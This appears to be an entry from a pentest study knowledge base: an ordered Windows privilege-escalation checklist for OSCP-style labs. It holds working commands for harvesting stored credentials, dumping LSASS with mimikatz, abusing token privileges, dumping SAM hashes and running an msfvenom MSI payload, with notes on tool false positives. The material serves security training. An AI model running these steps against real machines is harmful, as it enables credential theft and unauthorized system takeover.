title: Windows Privesc — Ordered Checklist (what to check FIRST)
body: A checklist is only useful if it's ORDERED - and if you remember it's a LOOP, not a line. Run the six steps in sequence; the moment you land creds or a shell as a new user, RESTART at step 0 as that user (see 'THE LOOP'). Two things that trip people at the keyboard and are baked into step 0 now: (1) what shell am I in - a WinRM/bind/network logon makes service enumeration throw access-denied, so you need an interactive logon or you'll wrongly conclude 'no services'; (2) who else is logged on - a live privileged session is a mimikatz/token-theft branch you'd otherwise miss. Mental model: (a) do I have a privilege that IS the exploit? (token privs), (b) did someone leave a cred or writable thing around? (creds -> misconfigs), (c) is this box even the right target? (exit to domain). Token privs first (highest-hit, lowest-effort); kernel last (can crash). Treat winPEAS/PowerUp as POINTERS you confirm by hand - never proof.
cmd:
# ==== 0. ORIENT - 30 seconds, ALWAYS first ==========
whoami /priv         # this line alone decides your first move
whoami /groups       # integrity level (Medium/High) + interesting groups
whoami /all
systeminfo | findstr /i "OS Name|OS Version|System Type"   # save for step 5

# >> WHAT SHELL AM I IN? (check this or step 4 lies to you) <<
#  WinRM / bind / reverse (NETWORK logon): Get-CimInstance & Get-Service
#    THROW ACCESS-DENIED for a non-admin -> you'll wrongly think "no services".
#    Fix: get an INTERACTIVE logon (RDP, or runas) before enumerating services.
#  RDP / console (INTERACTIVE logon): service enum works normally.
#  integrity: Medium = normal user OR filtered-admin (UAC). High = already elevated.

# >> WHO ELSE IS HERE? (opens the memory/impersonation branch) <<
query user            # another logged-on user = mimikatz / token theft target
query session
Get-Process | Select Id,ProcessName,@{N="User";E={(Get-Process -Id $_.Id -IncludeUserName -EA 0).UserName}}
#  A privileged user with a live session -> dump LSASS -> their creds/token. (mimikatz)

# ==== 1. TOKEN PRIVS - check FIRST (fastest win) ====
whoami /priv
#  SeImpersonate / SeAssignPrimaryToken  -> POTATO = instant SYSTEM. STOP here.
#  SeBackup / SeRestore                  -> reg save SAM+SYSTEM -> dump hashes
#  SeTakeOwnership                       -> take SAM -> read it
#  SeDebug                               -> mimikatz into a SYSTEM proc
#  SeLoadDriver                          -> malicious driver
#  ** Disabled != absent ** - the tool enables it. Presence is what matters.
#  WHY FIRST: IIS/MSSQL/service-account shells have SeImpersonate constantly.
#  It's the highest-hit, lowest-effort path on OSCP. Don't skip past it.

# ==== 2. ALREADY ADMIN @ MEDIUM INTEGRITY? ==========
# In Administrators but whoami /groups shows Medium Mandatory Level:
#   -> you don't need a "hunt", you need a UAC BYPASS. (win_uac_bypass)

# ==== 3. STORED CREDS - cheap, high-hit ============
# >> kick off winPEAS NOW (it's slow), read it in step 4 while you do this manually <<
Start-Process .\winPEASx64.exe -RedirectStandardOutput peas.txt   # or just run it in a 2nd shell
# PS history + transcripts (users clear Clear-History, NOT PSReadline):
(Get-PSReadlineOption).HistorySavePath
type <that path>
Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -ErrorAction SilentlyContinue | gc
# Autologon / cmdkey / configs:
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
cmdkey /list
# config files, kdbx, unattend, my.ini, web.config, RDCMan .settings  -> windows_creds
#  ** THE PATTERN: every new cred -> RE-ENUMERATE as that user. **
#  dave->steve->backupadmin was 3 creds in 3 files, each unlocked the next.

# ==== 4. MISCONFIGS - fast native check, THEN peas ==
# FAST + no big binary on disk (do this before/while winPEAS churns):
.\accesschk.exe /accepteula -uwcqv "Authenticated Users" *   # writable services
.\accesschk.exe /accepteula -uwcqv "Users" *
# writable dirs in PATH (DLL hijack surface):
$env:PATH -split ';' | % { icacls $_ 2>$null } | findstr /i "Users Everyone Authenticated"
# THEN read the winPEAS/PowerUp output you kicked off in step 3:
. .\PowerUp.ps1 ; Invoke-AllChecks
# Verify each hit in priority order (tools POINT, they don't PROVE):
#   weak service perms   -> icacls, look for EXPLICIT (F) w/o (I)  -> weak_service
#   unquoted service     -> space + no quotes + writable prefix    -> unquoted_service
#   AlwaysInstallElevated-> BOTH HKCU+HKLM = 1                      -> always_install_elevated
#     payoff: msfvenom -f msi -o e.msi ; msiexec /quiet /qn /i e.msi
#   writable sched task  -> icacls the action script               -> scheduled_tasks_win
#   DLL hijack           -> NAME NOT FOUND in writable dir          -> win_dll_hijack

# ==== 5. KERNEL / APP EXPLOIT - LAST resort =========
# Only when 1-4 are dry, source is reviewable, and a crash is acceptable.
# systeminfo -> wesng / searchsploit                               -> win_kernel_exploit

# ==== 6. EXIT CONDITION - the part people miss =======
# Plain domain user + nothing modifiable + no token priv:
#   -> STOP local privesc. This box may have NO SYSTEM path for you.
#   -> Your privesc is the DOMAIN: kerberoast / BloodHound / relay.
#   Don't grind a workstation for a SYSTEM that was never there.  -> vector_pivot_decision

# ==== THE LOOP - privesc is CYCLICAL, not one-pass ===
#  Got a shell/creds as a NEW user (steve, backupadmin, a svc acct)?
#  -> DON'T continue forward. RESTART at step 0 AS THAT USER.
#  New user = new whoami /priv, new readable files, new group memberships,
#  new service perms. The OffSec chain only works because each user re-ran
#  the whole checklist. A cred is a reset button, not a finish line.

# ==== TOOL-OUTPUT REALITY CHECK (winPEAS/PowerUp) ===
#  winPEAS RED != confirmed. It over-reports. Manually verify every hit.
#  winPEAS OS detect is unreliable (called Win11 "Win10"). Trust systeminfo.
#  winPEAS MISSES things: it skipped the desktop meeting-note, the transcript,
#    the PS history in the OffSec labs. Automated != complete. Do manual too.
#  winPEAS AD ACLs (GenericAll/WriteDACL) are the WORST offenders - it claimed
#    marcus had GenericAll over Domain Admins/krbtgt/DC. FALSE. Confirm every
#    AD edge in BloodHound (effective access) before you act on it.
#  PowerUp Install-ServiceBinary FALSELY says "not modifiable" when the service
#    path has a file-arg (--defaults-file=...). Trust your icacls (F), go manual.
#  Rule: PEAS/PowerUp DETECT. icacls / whoami /priv / BloodHound CONFIRM.
warn: Order matters more than completeness. whoami /priv FIRST - SeImpersonate ends the hunt immediately. winPEAS RED = 'look here', not 'confirmed'; it over-reports (especially AD ACLs) AND misses things (desktop notes, transcripts, PS history). PEAS/PowerUp DETECT; icacls, whoami /priv, and BloodHound CONFIRM. If you're a plain domain user with nothing modifiable, STOP - the box may have no SYSTEM path and your privesc is the domain.

choices.label: Another user logged on - dump LSASS/token
6. No local path - pivot to domain
